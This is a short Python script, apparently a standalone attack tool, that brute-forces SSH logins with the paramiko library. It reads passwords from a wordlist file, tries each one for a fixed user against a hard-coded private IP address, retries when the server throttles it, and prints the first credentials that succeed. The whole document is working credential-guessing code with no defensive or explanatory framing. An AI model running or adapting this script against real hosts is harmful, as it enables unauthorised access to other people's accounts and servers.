import paramiko
import socket
import time
from colorama import init, Fore
import argparse

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

def ssh_connect(host,user,passw):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host,username=user,password=passw,timeout=3)
    
    except socket.timeout:
        print(f"{RED}[!] Host : {(host)} is unreachable , timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid Credentails for {user}:{passw}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE} [*] Quota Exceeded , retrying{RESET}") 
        return ssh_connect(host,user,passw)
    else :
        print(f"{GREEN}[+] found :\n\t Host: {host}\n\tUser:{user}\n\tpassword:{passw}{RESET}")
        return True

def main():
    host = "10.1.0.24"
    passlist = "raz.txt"
    user = "raz"

    passlist = open(passlist).read().splitlines()

    for passw in passlist:
        if(ssh_connect(host,user,passw)):
            break
if __name__ == "__main__":    
    main()